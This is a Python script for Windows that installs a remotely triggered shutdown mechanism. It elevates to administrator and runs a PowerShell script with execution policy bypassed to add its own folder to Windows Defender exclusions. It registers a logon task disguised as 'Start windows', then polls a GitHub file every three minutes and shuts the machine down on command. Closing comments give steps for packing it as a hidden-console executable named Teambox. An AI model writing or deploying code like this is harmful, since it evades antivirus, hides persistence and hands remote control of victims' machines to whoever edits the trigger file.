import os
import subprocess
import sys
import time
import ctypes
import requests
import winshell

GITHUB_REPO_URL = "https://raw.githubusercontent.com/rikeshkumarrk/shutdown-trigger/main/trigger.txt"

# Define the base directory
BASE_DIR = os.path.join(os.path.expanduser("~"), "AppData", "Local", "ShutdownTrigger")
os.makedirs(BASE_DIR, exist_ok=True)  # Ensure the directory exists

# Path of the Python script to be excluded
SCRIPT_PATH = os.path.abspath(__file__)

# Path to the flag file
FLAG_FILE = os.path.join(BASE_DIR, 'setup_done.flag')

def is_admin():
    """Check if the script is run as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_exclusion_to_windows_defender():
    """Run PowerShell script to add the script folder to Windows Defender exclusions"""
    print("Adding exclusion to Windows Defender...")
    ps_script_content = f"""
    Param (
        [string]$Path = ""
    )
    
    function Test-Admin {{
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }}
    
    if (-not (Test-Admin)) {{
        Write-Host "Please run as Administrator!"
        exit
    }}
    
    Add-MpPreference -ExclusionPath $Path
    Write-Host "Added $Path to Windows Defender exclusion list."
    """
    ps_script_path = os.path.join(BASE_DIR, "add_exclusion.ps1")  # Store the script in BASE_DIR
    #exclusion from window defender for the correct exe path is not working it is excluding temp folder

    # Write PowerShell script to file
    with open(ps_script_path, 'w') as f:
        f.write(ps_script_content)

    cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{ps_script_path}" -Path "{os.path.dirname(SCRIPT_PATH)}"'
    print(f"Executing PowerShell command: {cmd}")
    subprocess.run(cmd, shell=True)

def create_task_scheduler_entry():
    """Create a Task Scheduler entry to run the script at user logon"""
    task_name = "Start windows"

    # Get the path of the current executable
    if getattr(sys, 'frozen', False):  # Check if the script is running as a PyInstaller executable
        exe_path = sys.executable  # Get the path of the executable
    else:
        exe_path = os.path.abspath(__file__)  # Fallback for testing when running as a script

    # The command to run (dynamically set the path of the executable)
    cmd = [
        "schtasks", "/create", "/tn", task_name,
        "/tr", f'"{exe_path}"',  # Use the current executable path
        "/sc", "ONLOGON",  # Trigger on user logon
        "/rl", "HIGHEST"   # Run with the highest privileges
    ]
    
    # Execute the command to create the task
    subprocess.run(cmd)

def shutdown_pc():
    """Shutdown the PC"""
    print("Shutting down the PC...")
    os.system("shutdown /s /t 1")

def check_github_trigger():
    """Check the GitHub file for shutdown trigger"""
    print("Checking GitHub for shutdown trigger...")
    try:
        response = requests.get(GITHUB_REPO_URL)
        if response.status_code == 200:
            content = response.text.strip()
            if content.upper() == "SHUTDOWN":
                shutdown_pc()
    except Exception as e:
        print(f"Error checking GitHub trigger: {e}")

def setup():
    """Perform setup tasks (run only once)"""
    print("Performing setup...")
    add_exclusion_to_windows_defender()  # Add exclusion to Windows Defender
    create_task_scheduler_entry()  # Add the script to startup
    
    # Create a flag file to indicate setup is complete
    with open(FLAG_FILE, 'w') as f:
        f.write("Setup complete")
    print(f"Setup complete. Flag file created at {FLAG_FILE}")

if __name__ == "__main__":
    # Check for a command-line argument to indicate admin relaunch
    if len(sys.argv) > 1 and sys.argv[1] == 'admin':
        print("Running setup with admin privileges...")
        setup()
    elif not os.path.exists(FLAG_FILE):  # Check if the flag file exists
        print(f"Flag file not found at {FLAG_FILE}. Running setup...")
        if is_admin():
            setup()  # Perform the setup tasks
        else:
            print("Requesting admin privileges...")
            # Relaunch the script with admin privileges and a flag ('admin')
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{SCRIPT_PATH}" admin', None, 1)
            sys.exit(0)  # Exit after requesting admin privileges
    else:
        print(f"Setup already complete. Flag file found at {FLAG_FILE}")

    # Main loop to check for GitHub trigger every 180 seconds
    while True:
        check_github_trigger()
        time.sleep(180)
# this code  is working with some issue
# cmd to make exe:- 
# pip install pyinstaller
# pyinstaller --onefile --noconsole --icon="C:\\Rikesh\\I\\Test app\\favicon.ico" Teambox.py